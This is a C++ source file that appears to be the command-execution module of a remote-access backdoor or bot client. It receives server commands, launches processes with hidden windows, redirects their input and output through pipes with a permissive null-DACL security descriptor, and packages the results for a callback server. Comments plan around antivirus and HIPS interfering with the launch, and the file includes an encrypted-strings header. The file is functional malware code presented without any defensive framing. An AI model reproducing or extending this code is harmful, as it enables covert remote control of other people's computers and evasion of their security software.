/*
	ceGeneric.cpp
*/

#include <Windows.h>
#include <Shellapi.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"					
#include "..\inc\CryptoStrings.h"		
#include "..\inc\MyStringRoutines.h"	
#include "..\inc\MyStreams.h"

#include "..\inc\DataCallbackManager.h"
#include "..\shared\CommStructures.h"

#include "ceGeneric.h"

/*
	Forms resulting CLIENT_COMMAND_RESULT structure according to passed params
	pResult & dwResultLen may be NULL or point to a buffer containing some output or specific error code with params
*/
VOID cmFormAnswer(DISPATCHER_CALLBACK_PARAMS *dcp, WORD wResult, LPVOID pPayload, DWORD dwPayloadLen)
{
	SERVER_COMMAND *sCommand;	// command + payload ptr
	CLIENT_COMMAND_RESULT *cRes;	// resulting internally allocated buffer
	DWORD dwLen = sizeof(CLIENT_COMMAND_RESULT) + dwPayloadLen;	// resulting len of answer buffer
	//	INNER_ENVELOPE *iEnvelope = NULL;	// inner envelope ptr to be used with data

	if (!dcp) { DbgPrint("ERR: dcp NULL"); return; }

	// init ptr
	sCommand = (SERVER_COMMAND *)dcp->pInBuffer;

	// alloc buffer to hold all resulting data
	cRes = (CLIENT_COMMAND_RESULT *)my_alloc(dwLen);

	// fill basic fields
	cRes->dwUniqCmdId = sCommand->dwUniqCmdId;
	cRes->wGenericResult = wResult;
	cRes->dwPayloadSize = dwPayloadLen;

	// append payload, if any
	if (dwPayloadLen) {

#ifdef _DEBUG
		if (IsBadReadPtr(pPayload, dwPayloadLen)) { DbgPrint("ERR: invalid read ptr %p len %u", pPayload, dwPayloadLen); }
#endif

		memcpy((LPVOID)((SIZE_T)cRes + sizeof(CLIENT_COMMAND_RESULT)), pPayload, dwPayloadLen);

	} // dwPayloadLen

	// assign result to callback server via envelope forming
	dcp->pAnswer = cmsAllocInitInnerEnvelope(cRes, dwLen, EID_COMMAND_RESULT);
	dcp->lAnswerLen = dwLen + sizeof(INNER_ENVELOPE);

	// free not needed buffer (copied by cmsAllocInitInnerEnvelope() )
	my_free(cRes);

	DbgPrint("OK: formed answer code %u with payload len %u", wResult, dwPayloadLen);

}

// same as cmFormAnswer(), but prepares a CMDEXEC_SPECIFIC_ERROR structure 
// wResult is assumed to be CER_ERR_SPECIFIC_ERROR
// NB: no GetLastError() calls should be made after any fail catched, because it is called here
// NB2: this function should contain no WinAPI calls before retrieving GetLastError() result
// set dwLastError to -1 in order to query GetLastError() internally 
VOID cmFormAnswerSpecificErr(DISPATCHER_CALLBACK_PARAMS *dcp, DWORD dwSpecificErrCode, DWORD dwLastError)
{
	CMDEXEC_SPECIFIC_ERROR csError = { 0 };	// error buffer, data is copied at cmFormAnswer() call

	if (dwLastError == -1) { csError.dwLastError = GetLastError(); }
	else { DbgPrint("WARN: forced le to be %p", dwLastError); csError.dwLastError = dwLastError; }
	csError.dwSpecificErrCode = dwSpecificErrCode;

	if (!dcp) { DbgPrint("ERR: dcp NULL"); return; }

	cmFormAnswer(dcp, CER_ERR_SPECIFIC_ERROR, &csError, sizeof(CMDEXEC_SPECIFIC_ERROR));

}

BOOL _cmdCreateStdPipes(CREATEPROCESS_PARAMS *cpParams)
{
	SECURITY_ATTRIBUTES saAttr = { 0 }; // for CreatePipe() to make inheritable handles	
	SECURITY_DESCRIPTOR sd = { 0 };

	// allow all sd
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	// prepare sec attrs
	memset(&saAttr, 0, sizeof(SECURITY_ATTRIBUTES));
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = &sd;

	// create pipes to be used for communications
	if (!CreatePipe(&cpParams->hStdInRead, &cpParams->hStdInWrite, &saAttr, 0)) { DbgPrint("ERR: CreatePipe() failed, code %p", GetLastError()); return FALSE; }
	if (!CreatePipe(&cpParams->hStdOutRead, &cpParams->hStdOutWrite, &saAttr, 0)) { DbgPrint("ERR: CreatePipe() failed, code %p", GetLastError()); return FALSE; }
	//	if (!CreatePipe(&cpParams->hStdErrRead, &cpParams->hStdErrWrite, &saAttr, 0)) { DbgPrint("ERR: CreatePipe() failed, code %p", GetLastError()); return FALSE; }

	// make controller's handles NOT inheritable - as stated in MSDN
	// we should process hStdInWrite, hStdOutRead, hStdErrRead
	if (!SetHandleInformation(cpParams->hStdInWrite, HANDLE_FLAG_INHERIT, 0)) { DbgPrint("ERR: SetHandleInformation() failed, code %p", GetLastError()); return FALSE; }
	if (!SetHandleInformation(cpParams->hStdOutRead, HANDLE_FLAG_INHERIT, 0)) { DbgPrint("ERR: SetHandleInformation() failed, code %p", GetLastError()); return FALSE; }
	//	if (!SetHandleInformation(cpParams->hStdErrRead, HANDLE_FLAG_INHERIT, 0)) { DbgPrint("ERR: SetHandleInformation() failed, code %p", GetLastError()); return FALSE; }

	return TRUE;
}

// simply call CloseHandle() for all pipes created at _cmdCreateStdPipes()
VOID _cmdFreeStdPipes(CREATEPROCESS_PARAMS *cpParams)
{
	CloseHandle(cpParams->hStdInRead);
	CloseHandle(cpParams->hStdInWrite);

	CloseHandle(cpParams->hStdOutRead);
	CloseHandle(cpParams->hStdOutWrite);

	//	CloseHandle(cpParams->hStdErrRead);
	//	CloseHandle(cpParams->hStdErrWrite);

}


// thread calling CreateProcess() / ShellExecute() 
DWORD WINAPI thrSafeExec(LPVOID lpParameter)
{
	CREATEPROCESS_PARAMS *cpParams = (CREATEPROCESS_PARAMS *)lpParameter;	// incoming params

	// CreateProcess()
	STARTUPINFO si = { 0 };
	BOOL bInheritHandles = FALSE;	// by default, no handle inheritance

	// ShellExecute()
	SHELLEXECUTEINFO se = { 0 };

	cpParams->dwLastError = 0;

	// check for special mode - removal of hanged thread
	if (cpParams->bNeedTerminateExecThread) {

		// save handle locally
		HANDLE hThread = cpParams->hExecThread;

		// answer to caller we are ready to start it's termination
		cpParams->bTerminationStarted = TRUE;

		// issue termination command
		DbgPrint("attempting to terminate hExecThread=%p", hThread);
		if (!TerminateThread(hThread, 0)) { DbgPrint("ERR: TerminateThread() failed code %p", GetLastError()); }

		// anyway, close handle
		CloseHandle(hThread);

		DbgPrint("exiting termination thread");
		ExitThread(0);

	}

	switch (cpParams->emExecMethod) {

	case EEM_CREATEPROCESS:

		// fill params
		si.cb = sizeof(STARTUPINFO);
		si.wShowWindow = SW_HIDE;
		si.dwFlags |= STARTF_USESHOWWINDOW;

		if (cpParams->hStdInRead) {

			DbgPrint("assigning alternative std handles");

			si.hStdError = cpParams->hStdOutWrite;	// instead of hStdErrWrite, output errors to stdout too
			si.hStdOutput = cpParams->hStdOutWrite;
			si.hStdInput = cpParams->hStdInRead;
			si.dwFlags |= STARTF_USESTDHANDLES;

			bInheritHandles = TRUE;
		} // handles set

		// wipe out resulting buffer
		cpParams->pi = { 0 };

#ifdef _DEBUG
		DbgPrint("about to CreateProcess():");
		if (cpParams->wszApplication) { DbgPrint("wszApplication=[%ws]", cpParams->wszApplication); }
		if (cpParams->wszCmdline) { DbgPrint("wszCmdline=[%ws]", cpParams->wszCmdline); }
#endif

		// call api (NB: may hang forever/terminate here due to AV/HIPS)
		// NB: wszCmdline may be altered by CreateProcessW()
		cpParams->bExecResult = CreateProcess(
			cpParams->wszApplication,
			cpParams->wszCmdline,
			NULL,
			NULL,
			bInheritHandles,
			0,
			NULL,
			NULL,
			&si,
			&cpParams->pi);

		// NB: nothing should be here, to save last error value

		break;


	case EEM_SHELLEXECUTE:

		// fill params
		se.cbSize = sizeof(SHELLEXECUTEINFO);
		se.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC | SEE_MASK_FLAG_NO_UI;
		se.lpFile = cpParams->wszApplication;
		se.nShow = SW_HIDE;

		// msdn
		CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
		cpParams->bExecResult = ShellExecuteEx(&se);

		// save hProcess handle
		cpParams->pi.hProcess = se.hProcess;

		break;


	} // switch

	// in any case, save last error value
	cpParams->dwLastError = GetLastError();

	ExitThread(0);
}

// safely creates a new process, with a protection from too long wait due to AV/HIPS lock of a thread, calling CreateProcess()
// seError points to a buffer to receive specific error code in case of failure
BOOL _cmdSafeExec(CREATEPROCESS_PARAMS *cpParams, EXEC_ERROR_CODE *seError)
{
	DWORD dwThreadId;

	cpParams->hExecThread = CreateThread(NULL, 0, thrSafeExec, cpParams, 0, &dwThreadId);

	DbgPrint("created exec thread: tid=%u, handle=%p, waiting for result..", dwThreadId, cpParams->hExecThread);

	if (WAIT_OBJECT_0 != WaitForSingleObject(cpParams->hExecThread, 25000)) {

		DbgPrint("ERR: thread failed to finish in 25s, starting terminator thread");

		cpParams->bNeedTerminateExecThread = TRUE;
		CloseHandle(CreateThread(NULL, 0, thrSafeExec, cpParams, 0, &dwThreadId));

		// wait for terminator to copy input params
		while (!cpParams->bTerminationStarted) { Sleep(250); }
		DbgPrint("terminator thread started, preparing error answer");

		// make error answer
		*seError = ERR_EXEC_HUNGED;

		return FALSE;

	} // thread failed to finish in 25s range

	// thread finished, check it's result
	if (!cpParams->bExecResult) {

		DbgPrint("ERR: thread reports exec failure, le=%p", cpParams->dwLastError);
		*seError = ERR_EXEC_FAILURE;
		return FALSE;

	}	// exec failed

	// exec was ok
	DbgPrint("exec ok");
	return TRUE;

}